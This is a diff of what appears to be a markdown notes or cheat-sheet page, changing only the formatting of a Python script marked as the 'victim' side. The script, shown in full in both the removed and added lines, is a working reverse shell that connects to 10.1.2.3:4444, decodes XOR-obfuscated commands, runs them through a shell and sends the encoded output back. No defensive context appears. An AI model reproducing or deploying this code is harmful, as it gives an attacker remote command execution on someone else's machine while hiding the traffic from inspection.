@@ -53,21 +53,22 @@ s.close()
 
 ( victim )<br />
 [ python script ]<br />
-`#!/usr/bin/python`<br />
-`import socket,subprocess,sys`<br />
-`RHOST = "10.1.2.3"`<br />
-`RPORT = 4444`<br />
-`s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`<br />
-`s.connect((RHOST, RPORT))`<br />
-`while True:`<br />
-`  data = s.recv(1024)`<br />
-`  en_data = bytearray(data)`<br />
-`  for i in range(len(en_data)):`<br />
-`    en_data[i] ^=0x5A`<br />
-`  comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)`<br />
-`  STDOUT, STDERR = comm.communicate()`<br />
-`  en_STDOUT = bytearray(STDOUT)`<br />
-`  for i in range(len(en_STDOUT)):`<br />
-`    en_STDOUT[i] ^=0x5A`<br />
-`  s.send(en_STDOUT)`<br />
-`s.close()`<br />
+```python
+import socket,subprocess,sys
+RHOST = "10.1.2.3"
+RPORT = 4444
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+while True:
+  data = s.recv(1024)
+  en_data = bytearray(data)
+  for i in range(len(en_data)):
+    en_data[i] ^=0x5A
+  comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+  STDOUT, STDERR = comm.communicate()
+  en_STDOUT = bytearray(STDOUT)
+  for i in range(len(en_STDOUT)):
+    en_STDOUT[i] ^=0x5A
+  s.send(en_STDOUT)
+s.close()
+```
